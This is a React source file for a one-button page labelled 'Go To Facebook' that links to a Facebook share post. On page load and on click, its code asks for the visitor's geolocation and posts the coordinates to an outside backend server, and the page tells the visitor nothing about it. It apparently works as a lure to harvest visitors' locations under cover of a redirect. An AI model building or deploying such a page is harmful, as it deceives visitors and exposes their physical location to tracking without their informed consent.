import { FaArrowRightLong } from "react-icons/fa6";
import './App.css';
import { useEffect } from "react";


function App() {


  const handleClick = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          fetch('https://loac-backend.onrender.com/location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude }),
          })
            .then(response => response.json())
            .then(data => {
              console.log('Response from server:', data);
            });
        },
        (error) => {
          console.error('Error getting location:', error);
        }
      );
    } else {
      console.log("success");
    }
  };

  useEffect(() =>{
    handleClick();
  },[])

  return (
    <div className="h-lvh flex flex-col justify-center items-center space-y-4">
     

      <a href="https://www.facebook.com/share/p/1Bnni7kkpR/" className=" absolute z-0">
        <button
          className="flex items-center border gap-2 px-3 font-thin"
          onClick={handleClick}
        >
          Go To Facebook <FaArrowRightLong />
        </button>
      </a>
    </div>
  );
}

export default App;

